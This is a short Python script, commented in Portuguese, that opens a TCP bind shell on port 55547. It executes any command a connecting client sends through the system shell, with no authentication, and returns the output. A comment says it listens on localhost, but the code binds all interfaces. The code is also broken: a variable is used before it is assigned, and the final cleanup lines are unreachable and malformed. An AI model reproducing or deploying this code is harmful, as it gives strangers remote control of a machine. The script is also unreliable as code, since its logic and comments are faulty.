import subprocess
import socket

def enviar(c):
    # pega o dado recebido do cliente e executa no shell
    if recived.decode() == "exit":
        c.close()
        conexão.close()
        exit()
    recived = c.recv(1024)
    process = subprocess.check_output(recived.decode(), shell=True, universal_newlines=True)
    # envia o resultado de volta para o cliente
    c.sendall(process.encode())

# cria o socket do servidor com ipv4 
conexão = socket.socket(socket.AF_INET, socket.SOCK_STREAM)



HOST = ""
PORT = 55547


# coloca o server pra escutar na porta 55547 no localhost
conexão.bind((HOST, PORT))
conexão.listen(1)
print("Escutando..")

# aceita a conexão do cliente
c, addr = conexão.accept()
print(f"Conexão {addr[0]} : {addr[1]}")

# começa a executar o comando q o client enviar 
while True:
    enviar(c)

# fecha a conexão
c.close()
conexão()